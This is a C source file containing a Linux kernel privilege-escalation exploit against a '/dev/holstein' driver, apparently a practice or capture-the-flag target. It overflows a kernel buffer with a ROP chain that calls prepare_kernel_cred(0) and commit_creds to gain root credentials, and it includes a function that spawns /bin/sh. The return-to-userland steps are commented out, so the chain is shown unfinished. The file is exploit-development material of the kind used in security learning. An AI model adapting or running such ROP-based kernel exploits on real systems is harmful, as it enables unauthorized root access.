#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>

unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state() {
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "movq %%rsp, %2\n"
        "pushfq\n"
        "popq %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory"
    );
}

static void win() {
    char *argv[] = { "/bin/sh", NULL };
    char *envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

#define commit_creds 0xffffffff8106e390
#define prepare_kernel_cred 0xffffffff8106e240
#define pop_rdi 0xffffffff8127bbdc
#define pop_rcx 0xffffffff812ea083
#define mov_rdi_rax_rep 0xffffffff8160c96b
#define swapgs_ret 0xffffffff8160bf7e
#define iretq 0xffffffff8180138b

static void exploit() {
    int fd = open("/dev/holstein", O_RDWR);

    char buf[0x500];
    memset(buf, 'A', 0x408);
    unsigned long *rop = (unsigned long *)&buf[0x408];
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep;
    *rop++ = commit_creds;
    // *rop++ = swapgs_ret;
    // *rop++ = iretq;
    // *rop++ = (unsigned long)&win;
    // *rop++ = user_cs;
    // *rop++ = user_rflags;
    // *rop++ = user_rsp;
    // *rop++ = user_ss;
    

    write(fd, buf, (void *)rop - (void *)buf);
    close(fd);

    return;
}

int main() {    
    save_state();
    exploit();

    return 0;
}